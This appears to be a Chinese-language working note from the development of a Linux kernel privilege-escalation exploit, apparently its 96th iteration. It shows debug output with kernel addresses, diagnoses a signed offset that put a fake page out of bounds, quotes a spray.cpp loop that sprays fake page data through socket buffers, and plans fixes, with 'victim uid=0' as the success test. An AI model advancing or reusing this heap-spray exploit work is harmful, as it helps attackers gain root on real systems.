# 43499 · 第二处不一致：payload_delta 是**有符号**的（round 96）

## 并列打印的结果（真机逐字）

```
TEMPTASK page=ffff800000018400/ffff800000018000  cfg=同 ✓  delta=18446744073709547904
TEMPSTAMP           ffff800000018400 ffff800000018000 0 0 0 0 0 size=264   ← 与页面一致 ✓
```

⇒ `delta = 0xFFFFFFFFFFFF0000` = **-65536（有符号）** ✗ ⇒ 而我把页面放在 `page_image.data() + delta` ⇒
  **负偏移 ⇒ 越界** ⇒ 发出去的那 12 672 字节里**不含页面** ✗ ⇒ "发送成功却等于没发" ✓（与观测一致 ✓）。

## 退役为此才分块（`spray.cpp`）

```c
for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf() + chunk + chunk_bias;      // 每块都铺一份页面
    … put32/put64 …                                        // 指针用 payload_base = base + payload_delta 算
}

// 发送：iov.iov_base = skb_buf(); iov.iov_len = SKB_SEND_SIZE; sendmsg(…)
```

⇒ 也就是说：**整块缓冲区（含 bias 偏移）都铺页面** ✓，指针用 `base + delta`（可为负 ✓）算 ✓；
  于是无论页落在块的哪一侧，覆盖都够 ✓。

## 本树要改的（下一步）

1. `payload_delta` 按**有符号**读（现在是 `std::uint64_t` ✗ ⇒ 负值变成巨大正数 ✓ 需改类型/解释 ✓）；
2. 发送缓冲改为**整块铺页面**：起点 = `min(0, delta)`、终点 = `max(0, delta) + 页长` ✓（一次发出 ✓）；
3. 指针一律用 `payload_base = prepared.base + delta` ✓（不再假设页在缓冲内为正偏移 ✓）；
4. 判据：`TEMPBISECT at2000` 或 `victim uid=0` ✓。
